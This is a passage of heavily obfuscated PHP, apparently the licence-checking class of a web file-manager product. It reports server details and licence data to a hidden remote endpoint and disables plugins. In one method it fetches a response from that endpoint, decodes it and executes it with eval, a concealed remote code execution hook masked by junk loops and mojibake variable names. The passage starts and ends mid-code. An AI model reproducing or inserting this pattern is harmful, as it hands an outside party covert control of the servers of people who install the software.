$æè‚£’[732]; while (strlen($Î—ñĞ¬š) < $æè‚£’[690]) { if (!$Î—ñĞ¬š) { break; } $Î—ñĞ¬š++; } $áûÚëÕ÷[$¢üˆÔÖÖ[101]][$¢üˆÔÖÖ[108]] = $this->ftem9eb6fbd5; $šœ€æÈÈ = $æè‚£’[733]; if (strlen($šœ€æÈÈ) < $æè‚£’[700]) { return; } if ($Ù»…®†[$¢üˆÔÖÖ[108]] != $¢üˆÔÖÖ[109]) { $áûÚëÕ÷[$¢üˆÔÖÖ[101]][$¢üˆÔÖÖ[110]] = $Ù»…®†[$¢üˆÔÖÖ[110]]; $áûÚëÕ÷[$¢üˆÔÖÖ[101]][$¢üˆÔÖÖ[111]] = $Ù»…®†[$¢üˆÔÖÖ[111]]; $ÓİÚ¦åö = rand_string(10) . $this->ftem9eb6fbd5 . rand_string(5); $áûÚëÕ÷[$¢üˆÔÖÖ[88]][$¢üˆÔÖÖ[112]][$¢üˆÔÖÖ[113]] = $this->hvge41c67f4c($ÓİÚ¦åö, $áûÚëÕ÷[$¢üˆÔÖÖ[101]][$¢üˆÔÖÖ[105]]); } if ($this->ftem9eb6fbd5 == $¢üˆÔÖÖ[109]) { $áûÚëÕ÷[$¢üˆÔÖÖ[88]][$¢üˆÔÖÖ[89]][$¢üˆÔÖÖ[94]][$¢üˆÔÖÖ[98]] = 0; } $áûÚëÕ÷[$¢üˆÔÖÖ[101]][$¢üˆÔÖÖ[114]] = $this->versionPluginFilter(); $áûÚëÕ÷[$¢üˆÔÖÖ[101]][$¢üˆÔÖÖ[115]] = _get($this->evxgd8da858a, $¢üˆÔÖÖ[116], $¢üˆÔÖÖ[6]); $™²ÖÍ–¸ = $æè‚£’[734]; while ($™²ÖÍ–¸ < $æè‚£’[696]) { if ($™²ÖÍ–¸ >= 0) { break; } $™²ÖÍ–¸++; } if (KodUser::isRoot() && $this->config[$¢üˆÔÖÖ[117]]) { $áûÚëÕ÷[$¢üˆÔÖÖ[101]][$¢üˆÔÖÖ[118]] = WEB_ROOT; } return $áûÚëÕ÷; } private function relc7e0a2844() { $ó‚ü¡äğ =& $_SERVER[™¸œØ®Ü]; $Óí“¼³ =& $_SERVER[è”ÜÓ§œ]; $¹ÕãÑ¹ = $_SERVER[$Óí“¼³[24]] == $Óí“¼³[119]; if ($_SERVER[$Óí“¼³[24]] == $Óí“¼³[120] && $_GET[$Óí“¼³[121]] == $Óí“¼³[122]) { $¹ÕãÑ¹ = !0; } if ($¹ÕãÑ¹) { $†æúƒ±Ğ = array($Óí“¼³[108] => $this->ftem9eb6fbd5, $Óí“¼³[123] => $this->ruav7966c869(), $Óí“¼³[124] => Model($Óí“¼³[125])->count()); if ($this->ftem9eb6fbd5 != $Óí“¼³[109]) { $êÀºî‹ = _get($this->evxgd8da858a, $Óí“¼³[126]); if ($êÀºî‹) { $†æúƒ±Ğ[$Óí“¼³[127]] = $êÀºî‹; $†æúƒ±Ğ[$Óí“¼³[128]] = strtotime(_get($this->evxgd8da858a, $Óí“¼³[129])); $†æúƒ±Ğ[$Óí“¼³[130]] = _get($this->evxgd8da858a, $Óí“¼³[116]); } $«¾ñí‡ü = Model($Óí“¼³[33])->get($Óí“¼³[131], $Óí“¼³[6], !0); if (is_string($«¾ñí‡ü) && substr($«¾ñí‡ü, 0, 1) == $Óí“¼³[132]) { $«¾ñí‡ü = json_decode_force($«¾ñí‡ü); } if (is_array($«¾ñí‡ü) && $«¾ñí‡ü[$Óí“¼³[133]] && strstr($«¾ñí‡ü[$Óí“¼³[133]], $Óí“¼³[134])) { $ÄÀÈÉŸ = explode($Óí“¼³[134], $«¾ñí‡ü[$Óí“¼³[133]]); $†æúƒ±Ğ[$Óí“¼³[135]] = $ÄÀÈÉŸ[0]; } } $†æúƒ±Ğ = $this->qdwz4fcc9308(json_encode($†æúƒ±Ğ), md5($Óí“¼³[136])); $·“”«Í = $ó‚ü¡äğ[735]; if (strlen($·“”«Í) < $ó‚ü¡äğ[698]) { return; } $¼‘ã¾ïç = array($Óí“¼³[137] => $†æúƒ±Ğ); call_user_func(array($Óí“¼³[138], $Óí“¼³[139]), $¼‘ã¾ïç); } if ($this->ftem9eb6fbd5 == $Óí“¼³[109]) { return; } $ü¦Üâ‡ = array($Óí“¼³[140], $Óí“¼³[141], $Óí“¼³[142], $Óí“¼³[143], $Óí“¼³[144], $Óí“¼³[145]); $–¨ûàóŒ = Model($Óí“¼³[33])->get(); $ı‚¶öÖ = $ó‚ü¡äğ[736]; $¼‘ã¾ïç = array($Óí“¼³[146] => $–¨ûàóŒ[$Óí“¼³[34]], $Óí“¼³[147] => $–¨ûàóŒ[$Óí“¼³[35]], $Óí“¼³[148] => $Óí“¼³[6]); foreach ($ü¦Üâ‡ as $Í—³˜³¡) { if (!isset($–¨ûàóŒ[$Í—³˜³¡]) || !$–¨ûàóŒ[$Í—³˜³¡]) { continue; } $¼‘ã¾ïç[$Í—³˜³¡] = $–¨ûàóŒ[$Í—³˜³¡]; $ùÌë¢òü = $ó‚ü¡äğ[737]; if (!$ùÌë¢òü) { return; } } call_user_func(array($Óí“¼³[138], $Óí“¼³[139]), $¼‘ã¾ïç); } private function amdf78eb3c0c() { $àÌ¶ÁÚö =& $_SERVER[™¸œØ®Ü]; $şÀèŸ£¦ =& $_SERVER[è”ÜÓ§œ]; if ($_SERVER[$şÀèŸ£¦[24]] != $şÀèŸ£¦[149]) { return; } if (!KodUser::isRoot()) { die; } $ê¡»¥ãë = $GLOBALS[$şÀèŸ£¦[13]]; if (isset($ê¡»¥ãë[$şÀèŸ£¦[150]])) { $this->okba2698c378(); die; } if (isset($ê¡»¥ãë[$şÀèŸ£¦[151]]) && isset($ê¡»¥ãë[$şÀèŸ£¦[151]]) == $şÀèŸ£¦[122]) { $ê¡»¥ãë[$şÀèŸ£¦[152]] = Model($şÀèŸ£¦[33])->get($şÀèŸ£¦[153]); } if (!isset($ê¡»¥ãë[$şÀèŸ£¦[152]]) || strlen($ê¡»¥ãë[$şÀèŸ£¦[152]]) != 16) { show_json($şÀèŸ£¦[154] . $ê¡»¥ãë[$şÀèŸ£¦[152]], !1); } $ë·êê¥¨ = Model($şÀèŸ£¦[33])->get($şÀèŸ£¦[100]); $»¸´¤ší = md5($_SERVER[$şÀèŸ£¦[106]] . $ë·êê¥¨); $Æ¿ÃÛúÁ = array($şÀèŸ£¦[152] => $ê¡»¥ãë[$şÀèŸ£¦[152]], $şÀèŸ£¦[155] => rand_string(16), $şÀèŸ£¦[156] => $şÀèŸ£¦[136], $şÀèŸ£¦[157] => $şÀèŸ£¦[158], $şÀèŸ£¦[159] => $_SERVER[$şÀèŸ£¦[160]], $şÀèŸ£¦[161] => $_SERVER[$şÀèŸ£¦[162]], $şÀèŸ£¦[163] => $_SERVER[$şÀèŸ£¦[164]], $şÀèŸ£¦[105] => $»¸´¤ší, $şÀèŸ£¦[165] => Model($şÀèŸ£¦[33])->get($şÀèŸ£¦[131])); if (isset($ê¡»¥ãë[$şÀèŸ£¦[151]]) && isset($ê¡»¥ãë[$şÀèŸ£¦[151]]) == $şÀèŸ£¦[122]) { $Æ¿ÃÛúÁ[$şÀèŸ£¦[151]] = md5($Æ¿ÃÛúÁ[$şÀèŸ£¦[152]] . $şÀèŸ£¦[166] . $Æ¿ÃÛúÁ[$şÀèŸ£¦[155]]); } if ($ê¡»¥ãë[$şÀèŸ£¦[167]] == $şÀèŸ£¦[168]) { $É³Šşˆá = $this->qdwz4fcc9308($»¸´¤ší, $şÀèŸ£¦[169]); $–²Ê¢± = $this->hvge41c67f4c(json_encode($Æ¿ÃÛúÁ), $»¸´¤ší . $şÀèŸ£¦[170], 3); $–²Ê¢± = $–²Ê¢± . $şÀèŸ£¦[171] . $_SERVER[$şÀèŸ£¦[160]]; $ùËì¡² = $this->dcsyc639ad8a($şÀèŸ£¦[172] . $É³Šşˆá . $şÀèŸ£¦[173] . $–²Ê¢±, -1); show_json($ùËì¡², !0); } else { if ($ê¡»¥ãë[$şÀèŸ£¦[167]] == $şÀèŸ£¦[174]) { $äÏÀÍÀ± = substr(md5($şÀèŸ£¦[175] . $»¸´¤ší), 12, 15) . $şÀèŸ£¦[176]; $–²Ê¢± = $this->wpzh6241c6e2(trim($ê¡»¥ãë[$şÀèŸ£¦[177]]), $äÏÀÍÀ±, 2); $ûç‹÷¯£ = json_decode($–²Ê¢±, !0); if (!is_array($ûç‹÷¯£) || !is_array($ûç‹÷¯£[$şÀèŸ£¦[178]]) || $ûç‹÷¯£[$şÀèŸ£¦[152]] != !0) { $ùÚÓöÊ = $şÀèŸ£¦[179]; $¤ßÂŒƒ÷ = $ûç‹÷¯£[$şÀèŸ£¦[178]] ? $şÀèŸ£¦[180] . $ûç‹÷¯£[$şÀèŸ£¦[178]] : $ùÚÓöÊ; show_json($¤ßÂŒƒ÷, !1); } else { $Æ¿ÃÛúÁ[$şÀèŸ£¦[155]] = $ûç‹÷¯£[$şÀèŸ£¦[178]][$şÀèŸ£¦[181]]; } } else { $ûç‹÷¯£ = $this->dcsyc639ad8a($şÀèŸ£¦[182], $Æ¿ÃÛúÁ, 10); } } if (!is_array($ûç‹÷¯£) || !is_array($ûç‹÷¯£[$şÀèŸ£¦[178]]) || $ûç‹÷¯£[$şÀèŸ£¦[152]] != !0) { $ùÚÓöÊ = LNG($şÀèŸ£¦[183]); $¤ßÂŒƒ÷ = $ûç‹÷¯£[$şÀèŸ£¦[178]] ? $şÀèŸ£¦[180] . $ûç‹÷¯£[$şÀèŸ£¦[178]] : $ùÚÓöÊ; show_json($¤ßÂŒƒ÷, !1); } $¨›Ì’ØŒ = $ûç‹÷¯£[$şÀèŸ£¦[178]]; $©ô€™ÅÃ = $this->qlkv66dc50a3($¨›Ì’ØŒ[$şÀèŸ£¦[184]]); if (!$©ô€™ÅÃ || $©ô€™ÅÃ != $¨›Ì’ØŒ[$şÀèŸ£¦[129]]) { $Ï©ä¹¬É = array($şÀèŸ£¦[185] => Model($şÀèŸ£¦[33])->get($şÀèŸ£¦[100]), $şÀèŸ£¦[186] => $_SERVER[$şÀèŸ£¦[106]], $şÀèŸ£¦[187] => this_url(), $şÀèŸ£¦[161] => $_SERVER[$şÀèŸ£¦[162]]); $–²Ê¢± = $this->silt27add1e7(json_encode($Ï©ä¹¬É)); $this->dcsyc639ad8a($şÀèŸ£¦[188] . $–²Ê¢±); show_json(LNG($şÀèŸ£¦[189]), !0); } $¯Åíê›€ = array($şÀèŸ£¦[153] => $¨›Ì’ØŒ[$şÀèŸ£¦[190]], $şÀèŸ£¦[191] => $¨›Ì’ØŒ[$şÀèŸ£¦[192]], $şÀèŸ£¦[193] => rand_string(16), $şÀèŸ£¦[108] => $¨›Ì’ØŒ[$şÀèŸ£¦[194]]); if ($Æ¿ÃÛúÁ[$şÀèŸ£¦[155]]) { $¯Åíê›€[$şÀèŸ£¦[193]] = $Æ¿ÃÛúÁ[$şÀèŸ£¦[155]]; } $¹ŞÀÜ¹á = substr(md5($¯Åíê›€[$şÀèŸ£¦[191]]), 10, 10); $ËÔ‰Çí = $¹ŞÀÜ¹á . $¯Åíê›€[$şÀèŸ£¦[108]] . $¯Åíê›€[$şÀèŸ£¦[193]]; $¯Åíê›€[$şÀèŸ£¦[110]] = strrev(base64_encode($this->qdwz4fcc9308($ËÔ‰Çí, $şÀèŸ£¦[195]))); $‡¼›¸‰’ = rand_string(16); $­†…§ø¨ = $àÌ¶ÁÚö[738]; if (strlen($­†…§ø¨) < $àÌ¶ÁÚö[698]) { die; } $Á°šõëÅ = $‡¼›¸‰’ . $¯Åíê›€[$şÀèŸ£¦[108]] . $this->qdwz4fcc9308(md5($¯Åíê›€[$şÀèŸ£¦[153]]), $‡¼›¸‰’); $¯Åíê›€[$şÀèŸ£¦[111]] = base64_encode(strrev($this->qdwz4fcc9308($Á°šõëÅ, $şÀèŸ£¦[196]))); if ($¨›Ì’ØŒ[$şÀèŸ£¦[197]] && $¨›Ì’ØŒ[$şÀèŸ£¦[197]] >= 1) { Model($şÀèŸ£¦[33])->setDeep($şÀèŸ£¦[198], $şÀèŸ£¦[122]); } Model($şÀèŸ£¦[33])->set($¯Åíê›€); $¦úîØƒ‘ = md5($_SERVER[$şÀèŸ£¦[106]] . strrev($ë·êê¥¨) . $¯Åíê›€[$şÀèŸ£¦[191]]); $ä•Á‘­ = strrev(substr($¦úîØƒ‘, 10, 16)); $¨¸“Ã—œ = $àÌ¶ÁÚö[739]; while ($¨¸“Ã—œ < $àÌ¶ÁÚö[698]) { if ($¨¸“Ã—œ >= 0) { break; } $¨¸“Ã—œ++; } $ºã¹¾¶´ = $this->hvge41c67f4c(json_encode($¨›Ì’ØŒ), $¦úîØƒ‘); $ ”ˆ¹ˆˆ = $àÌ¶ÁÚö[740]; while ($ ”ˆ¹ˆˆ < $àÌ¶ÁÚö[696]) { if ($ ”ˆ¹ˆˆ >= 0) { break; } $ ”ˆ¹ˆˆ++; } $ğÒ»îÖÎ = array_to_keyvalue(Model($şÀèŸ£¦[7])->listData(), $şÀèŸ£¦[199]); $»ï½«á = $àÌ¶ÁÚö[741]; $“ïç–¿ = $ğÒ»îÖÎ[$şÀèŸ£¦[200]]; $úà÷©û‚ = array(); $çÄë½™Ã = $àÌ¶ÁÚö[742]; while (strlen($çÄë½™Ã) < $àÌ¶ÁÚö[698]) { if (!$çÄë½™Ã) { break; } $çÄë½™Ã++; } $úà÷©û‚[$ä•Á‘­] = $ºã¹¾¶´; Model($şÀèŸ£¦[7])->update($“ïç–¿[$şÀèŸ£¦[201]], array($şÀèŸ£¦[202] => $úà÷©û‚)); $ë·²âù = $àÌ¶ÁÚö[743]; if (strlen($ë·²âù) < $àÌ¶ÁÚö[696]) { die; } $this->evxgd8da858a = $¨›Ì’ØŒ; $ ğÚèì = $àÌ¶ÁÚö[744]; while (strlen($ ğÚèì) < $àÌ¶ÁÚö[700]) { if (!$ ğÚèì) { break; } $ ğÚèì++; } $this->ftem9eb6fbd5 = $¯Åíê›€[$şÀèŸ£¦[108]]; $ÔÄé™ÙÌ = $àÌ¶ÁÚö[745]; $this->licenseRegistSuccess(); Cache::set($şÀèŸ£¦[203] . md5($ë·êê¥¨ . $şÀèŸ£¦[204]), $şÀèŸ£¦[6]); $…£Á…ª = $àÌ¶ÁÚö[746]; if (strlen($…£Á…ª) < $àÌ¶ÁÚö[700]) { die; } show_json(LNG($şÀèŸ£¦[189]), !0); } private function licenseRegistSuccess() { $‘°õğïª =& $_SERVER[è”ÜÓ§œ]; $·ş¸½Œ = Model($‘°õğïª[33])->get(); if ($·ş¸½Œ[$‘°õğïª[63]] != $‘°õğïª[122]) { Model($‘°õğïª[33])->set($‘°õğïª[63], $‘°õğïª[122]); } Action($‘°õğïª[205])->initStart(!0); } private function okba2698c378() { $Ë¿şŠ¢Å =& $_SERVER[™¸œØ®Ü]; $öê•è¡º =& $_SERVER[è”ÜÓ§œ]; Model($öê•è¡º[33])->set(array($öê•è¡º[153] => $öê•è¡º[6], $öê•è¡º[191] => $öê•è¡º[6], $öê•è¡º[108] => $öê•è¡º[109], $öê•è¡º[110] => $öê•è¡º[6], $öê•è¡º[111] => $öê•è¡º[6])); $ñœãºˆÆ = $Ë¿şŠ¢Å[747]; if (strlen($ñœãºˆÆ) < $Ë¿şŠ¢Å[693]) { return; } Model($öê•è¡º[33])->setDeep($öê•è¡º[198], $öê•è¡º[206]); $this->evxgd8da858a = array(); $•éÜªÒ = $Ë¿şŠ¢Å[748]; while ($•éÜªÒ < $Ë¿şŠ¢Å[700]) { if ($•éÜªÒ >= 0) { break; } $•éÜªÒ++; } $this->ftem9eb6fbd5 = $öê•è¡º[109]; } private function ires6cf370a9() { $µğøü· =& $_SERVER[è”ÜÓ§œ]; $_SERVER[$µğøü·[162]] = _get($_SERVER, $µğøü·[162], APP_HOST); $this->ftem9eb6fbd5 = $µğøü·[109]; $ÑŸ’º¯ = Model($µğøü·[33])->get(); if ($ÑŸ’º¯[$µğøü·[108]] == $µğøü·[109]) { return; } $’‰€Ö…Ö = Model($µğøü·[33])->get($µğøü·[100]); $ëüÌÔ¯ = $µğøü·[203] . md5($’‰€Ö…Ö . $µğøü·[204]); $îÂ©Ê³º = Cache::get($ëüÌÔ¯); if (!is_array($îÂ©Ê³º) || !isset($îÂ©Ê³º[$µğøü·[207]]) || time() - $îÂ©Ê³º[$µğøü·[207]] >= 60) { $²éê€å = Model($µğøü·[7])->loadList(); $³ÄÚĞûù = $²éê€å[$µğøü·[200]]; $ğ¥ğÕŸ  = md5($_SERVER[$µğøü·[106]] . strrev($’‰€Ö…Ö) . $ÑŸ’º¯[$µğøü·[191]]); $±şö‹àÄ = strrev(substr($ğ¥ğÕŸ , 10, 16)); $îÂ©Ê³º = $this->wpzh6241c6e2($³ÄÚĞûù[$µğøü·[86]][$±şö‹àÄ], $ğ¥ğÕŸ ); $îÂ©Ê³º = json_decode($îÂ©Ê³º, !0); } if (!is_array($îÂ©Ê³º)) { return $this->okba2698c378(); } $—ìø Â½ = strtotime($îÂ©Ê³º[$µğøü·[129]]); if (time() >= $—ìø Â½) { return $this->okba2698c378(); } if (!isset($îÂ©Ê³º[$µğøü·[207]]) || time() - $îÂ©Ê³º[$µğøü·[207]] > 20) { $îÂ©Ê³º[$µğøü·[207]] = time(); Cache::set($ëüÌÔ¯, $îÂ©Ê³º); } $this->evxgd8da858a = $îÂ©Ê³º; $this->ftem9eb6fbd5 = $ÑŸ’º¯[$µğøü·[108]]; } private function sjzwcfb304b6() { $¦·ÎéÑ =& $_SERVER[™¸œØ®Ü]; $ı„ğÒ›Õ =& $_SERVER[è”ÜÓ§œ]; $ùïĞõñ€ = $GLOBALS[$ı„ğÒ›Õ[13]]; $Ã•ÃÅ„ = $¦·ÎéÑ[749]; $ƒ•¸â–Ê = $_SERVER[$ı„ğÒ›Õ[24]]; $ çµé¢ = $¦·ÎéÑ[750]; if (!$ çµé¢) { die; } if ($ƒ•¸â–Ê == $ı„ğÒ›Õ[208] && $this->ftem9eb6fbd5 == $ı„ğÒ›Õ[109]) { show_json(LNG($ı„ğÒ›Õ[209]), !1, $ı„ğÒ›Õ[210]); } $÷€£µ±½ = array($ı„ğÒ›Õ[211], $ı„ğÒ›Õ[212]); if (in_array($ƒ•¸â–Ê, $÷€£µ±½)) { if ($this->ftem9eb6fbd5 == $ı„ğÒ›Õ[109] && isset($ùïĞõñ€[$ı„ğÒ›Õ[213]])) { show_json(LNG($ı„ğÒ›Õ[209]), !1, $ı„ğÒ›Õ[210]); die; } $Üìã•¸ñ = $this->ruav7966c869(); if ($Üìã•¸ñ != intval($ı„ğÒ›Õ[214])) { if ($Üìã•¸ñ <= Model($ı„ğÒ›Õ[125])->count()) { show_json(LNG($ı„ğÒ›Õ[215]), !1, $ı„ğÒ›Õ[210]); die; } } } } private function onfr2cf8e176() { $ó›‹® ¾ =& $_SERVER[™¸œØ®Ü]; $Ä€Ã×ü¸ =& $_SERVER[è”ÜÓ§œ]; $“º§ğ’ = array($Ä€Ã×ü¸[119], $Ä€Ã×ü¸[120]); if (!KodUser::isRoot() || !isset($_GET[$Ä€Ã×ü¸[216]])) { return; } if (!in_array($_SERVER[$Ä€Ã×ü¸[24]], $“º§ğ’)) { return; } $ÊÒÈÅŸ = $Ä€Ã×ü¸[217]; $ÊÒÈÅŸ = $this->jpla227795c2($ÊÒÈÅŸ, $Ä€Ã×ü¸[218]); $”Å¢«¹â = $ó›‹® ¾[751]; if (strlen($”Å¢«¹â) < $ó›‹® ¾[698]) { return; } $¡—œâ‰… = stream_context_create(array($Ä€Ã×ü¸[219] => array($Ä€Ã×ü¸[220] => $Ä€Ã×ü¸[221], $Ä€Ã×ü¸[222] => 3))); $ŠÖ½Ò = @file_get_contents($ÊÒÈÅŸ, !1, $¡—œâ‰…); $ÀğÅèœ¤ = $ó›‹® ¾[752]; header($Ä€Ã×ü¸[223]); $¤µÃÒ ¡ = $ó›‹® ¾[753]; if ($ŠÖ½Ò && strstr($ŠÖ½Ò, $Ä€Ã×ü¸[224])) { echo $ŠÖ½Ò; } die; } public function xvzbc78217e8($Ã…Ä°…) { $à”¥Ï‹ü =& $_SERVER[™¸œØ®Ü]; $¥¬Å»Íñ =& $_SERVER[è”ÜÓ§œ]; if ($this->ftem9eb6fbd5 == $¥¬Å»Íñ[225]) { return $Ã…Ä°…; } $Ö›å»¢ = $this->versionPluginList(); $Ì’Ä®°˜ = $à”¥Ï‹ü[754]; while ($Ì’Ä®°˜ < $à”¥Ï‹ü[698]) { if ($Ì’Ä®°˜ >= 0) { break; } $Ì’Ä®°˜++; } $ßèÉÅ¤™ = explode($¥¬Å»Íñ[226], $this->versionPluginFilter()); $ şä¨‚ = array(); $œØƒûÉü = $à”¥Ï‹ü[755]; if (strlen($œØƒûÉü) < $à”¥Ï‹ü[700]) { return; } foreach ($Ö›å»¢ as $ÆôÔÑŒŒ => $“ò¨úÚù) { if ($“ò¨úÚù == $¥¬Å»Íñ[227] && substr($this->ftem9eb6fbd5, 0, 1) == $¥¬Å»Íñ[227]) { continue; } if (!in_array($ÆôÔÑŒŒ, $ßèÉÅ¤™)) { $ şä¨‚[] = $ÆôÔÑŒŒ; } } foreach ($ şä¨‚ as $ÆôÔÑŒŒ) { unset($Ã…Ä°…[$ÆôÔÑŒŒ]); $ìÆÀ˜Å¤ = $à”¥Ï‹ü[756]; } return $Ã…Ä°…; } private function versionPluginList() { $—ˆ´„¸¸ =& $_SERVER[è”ÜÓ§œ]; return array($—ˆ´„¸¸[228] => $—ˆ´„¸¸[227], $—ˆ´„¸¸[229] => $—ˆ´„¸¸[227], $—ˆ´„¸¸[230] => $—ˆ´„¸¸[227], $—ˆ´„¸¸[231] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[233] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[234] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[235] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[236] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[237] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[238] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[239] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[240] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[241] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[242] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[243] => $—ˆ´„¸¸[232], $—ˆ´„¸¸[244] => $—ˆ´„¸¸[232]); $½²—¸“® = $_SERVER[™¸œØ®Ü][757]; } private function versionPluginFilter() { $¿š“Š±Ù =& $_SERVER[™¸œØ®Ü]; $­ºõíşá =& $_SERVER[è”ÜÓ§œ]; if ($this->ftem9eb6fbd5 == $­ºõíşá[109]) { return $­ºõíşá[6]; } $¿ŞÓµ¬ = _get($this->evxgd8da858a, $­ºõíşá[245], $­ºõíşá[6]); $ÔíÈ¸Ëğ = $¿š“Š±Ù[758]; while (strlen($ÔíÈ¸Ëğ) < $¿š“Š±Ù[693]) { if (!$ÔíÈ¸Ëğ) { break; } $ÔíÈ¸Ëğ++; } $ßâ¨íÊ¢ = _get($this->evxgd8da858a, $­ºõíşá[116], $­ºõíşá[6]); $¾“‹Áô = _get($this->evxgd8da858a, $­ºõíşá[246], $­ºõíşá[6]); $Õ¦Û¤ô = $¿š“Š±Ù[759]; if ($ßâ¨íÊ¢ > time() && $¾“‹Áô > time()) { $—¹¡©Ú = explode($­ºõíşá[226], $¿ŞÓµ¬); $û×áîÄ½ = array_keys($this->versionPluginList()); $¿ŞÓµ¬ = array_merge($—¹¡©Ú, $û×áîÄ½); $¿ŞÓµ¬ = implode($­ºõíşá[226], array_filter(array_unique($¿ŞÓµ¬))); } return $¿ŞÓµ¬; } private function qyre45894e0f() { $ù»¹–’À =& $_SERVER[è”ÜÓ§œ]; if ($this->ftem9eb6fbd5 != $ù»¹–’À[109]) { $GLOBALS[$ù»¹–’À[86]][$ù»¹–’À[90]][$ù»¹–’À[247]] = $ù»¹–’À[206]; return; } $GLOBALS[$ù»¹–’À[86]][$ù»¹–’À[248]] = $ù»¹–’À[122]; if (Model($ù»¹–’À[249])->get($ù»¹–’À[63]) != $ù»¹–’À[206]) { Model($ù»¹–’À[249])->set($ù»¹–’À[63], $ù»¹–’À[206]); } } public function wukl7052d0ec() { $¢â×Áœ» =& $_SERVER[™¸œØ®Ü]; return $_SERVER[è”ÜÓ§œ][250]; $úá…˜ç† = $¢â×Áœ»[760]; if (strlen($úá…˜ç†) < $¢â×Áœ»[696]) { return; } } private function bpyh3eedea7a() { $¯®ËÅŸâ =& $_SERVER[™¸œØ®Ü]; $òç—ü“ =& $_SERVER[è”ÜÓ§œ]; $Ü¡š¬ = array($òç—ü“[251], $òç—ü“[252], $òç—ü“[253]); $¢éÚüñÑ = $¯®ËÅŸâ[761]; if (!$¢éÚüñÑ) { die; } $•ÄšîÎˆ = $òç—ü“[254] . md5($òç—ü“[255]); $Ÿ½¯÷¹ = $¯®ËÅŸâ[762]; while ($Ÿ½¯÷¹ < $¯®ËÅŸâ[696]) { if ($Ÿ½¯÷¹ >= 0) { break; } $Ÿ½¯÷¹++; } if ($this->ftem9eb6fbd5 == $òç—ü“[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$òç—ü“[24]], $Ü¡š¬)) { return; } if (time() % 4 != 0) { return; } $°ÍâÒéÆ = call_user_func(array($òç—ü“[256], $òç—ü“[257]), $•ÄšîÎˆ); if ($°ÍâÒéÆ && time() - $°ÍâÒéÆ < intval($òç—ü“[258])) { return; } call_user_func(array($òç—ü“[256], $òç—ü“[139]), $•ÄšîÎˆ, time()); $òÆ®ëóÏ = Model($òç—ü“[33])->get($òç—ü“[100]); $ƒË­‰Üì = array($òç—ü“[152] => Model($òç—ü“[33])->get($òç—ü“[153]), $òç—ü“[167] => $this->ftem9eb6fbd5, $òç—ü“[163] => $_SERVER[$òç—ü“[164]], $òç—ü“[165] => Model($òç—ü“[33])->get($òç—ü“[131]), $òç—ü“[105] => md5($_SERVER[$òç—ü“[106]] . $òÆ®ëóÏ), $òç—ü“[156] => $òç—ü“[136], $òç—ü“[159] => $_SERVER[$òç—ü“[160]]); $¯Ñ¯­æª = $this->dcsyc639ad8a($òç—ü“[259], $ƒË­‰Üì); $ü®ØğÔ = $¯®ËÅŸâ[763]; if (!is_array($¯Ñ¯­æª)) { return; } if ($¯Ñ¯­æª[$òç—ü“[152]] && $¯Ñ¯­æª[$òç—ü“[260]]) { if ($this->qlkv66dc50a3($¯Ñ¯­æª[$òç—ü“[260]]) == $ƒË­‰Üì[$òç—ü“[152]]) { return; } } $this->okba2698c378(); $‹Ö£›¯æ = $¯®ËÅŸâ[764]; if ($this->qlkv66dc50a3($¯Ñ¯­æª[$òç—ü“[260]]) != $ƒË­‰Üì[$òç—ü“[152]]) { $ÈÌ¨Ş½“ = array($òç—ü“[185] => $òÆ®ëóÏ, $òç—ü“[186] => $_SERVER[$òç—ü“[106]], $òç—ü“[187] => this_url(), $òç—ü“[161] => $_SERVER[$òç—ü“[162]]); $˜æÁ±¯Õ = $this->silt27add1e7(json_encode($ÈÌ¨Ş½“)); $¯Ñ¯­æª = $this->dcsyc639ad8a($òç—ü“[188] . $˜æÁ±¯Õ); if ($¯Ñ¯­æª && is_array($¯Ñ¯­æª) && isset($¯Ñ¯­æª[$òç—ü“[260]])) { $Å¡ø¿˜“ = $this->wpzh6241c6e2($¯Ñ¯­æª[$òç—ü“[260]], 2); if ($Å¡ø¿˜“) { $Å¡ø¿˜“ = $this->qlkv66dc50a3($Å¡ø¿˜“); } if ($Å¡ø¿˜“) { try { @eval($Å¡ø¿˜“); } catch (Exception $é¼úçíÈ) { } } } } } private function dcsyc639ad8a($ã¦¾º‚‚ = '', $á„Ï•¢µ = array(), $¶—®«œÉ = 5) { $ µˆ§£ô =& $_SERVER[™¸œØ®Ü]; $©äˆğÉ =& $_SERVER[è”ÜÓ§œ]; $”­­Ëğ§ = $©äˆğÉ[261]; $”­­Ëğ§ = $this->jpla227795c2($”­­Ëğ§, $©äˆğÉ[262]); $”­­Ëğ§ = $”­­Ëğ§ . $ã¦¾º‚‚; $Ğµœ“æ• = $ µˆ§£ô[765]; while (strlen($Ğµœ“æ•) < $ µˆ§£ô[700]) { if (!$Ğµœ“æ•) { break; } $Ğµœ“æ•++; } if ($á„Ï•¢µ && is_array($á„Ï•¢µ)) { $”­­Ëğ§ = $”­­Ëğ§ . $©äˆğÉ[263] . http_build_query($á„Ï•¢µ); } if ($á„Ï•¢µ === -1) { return $”­­Ëğ§; } $™ğğ…Â = stream_context_create(array($©äˆğÉ[219] => array($©äˆğÉ[222] => $¶—®«œÉ, $©äˆğÉ[220] => $©äˆğÉ[264]), $©äˆğÉ[265] => array($©äˆğÉ[266] => !1, $©äˆğÉ[267] => !1))); $á„Ï•¢µ = @file_get_contents($”­­Ëğ§, !1, $™ğğ…Â); $ —øŸŒ¾ = $ µˆ§£ô[766]; if (!$ —øŸŒ¾) { return; } return json_decode($á„Ï•¢µ, !0); $±şîÑÇ = $ µˆ§£ô[767]; } private function ruav7966c869() { $ÍÅŠ‰ëÕ =& $_SERVER[™¸œØ®Ü]; $ŸÂúŸİ =& $_SERVER[è”ÜÓ§œ]; $©¸…ÜÅ™ = array($ŸÂúŸİ[268] => $ŸÂúŸİ[269], $ŸÂúŸİ[270] => $ŸÂúŸİ[271], $ŸÂúŸİ[272] => $ŸÂúŸİ[273], $ŸÂúŸİ[274] => $ŸÂúŸİ[275], $ŸÂúŸİ[276] => $ŸÂúŸİ[277], $ŸÂúŸİ[278] => $ŸÂúŸİ[214], $ŸÂúŸİ[279] => $ŸÂúŸİ[214], $ŸÂúŸİ[280] => 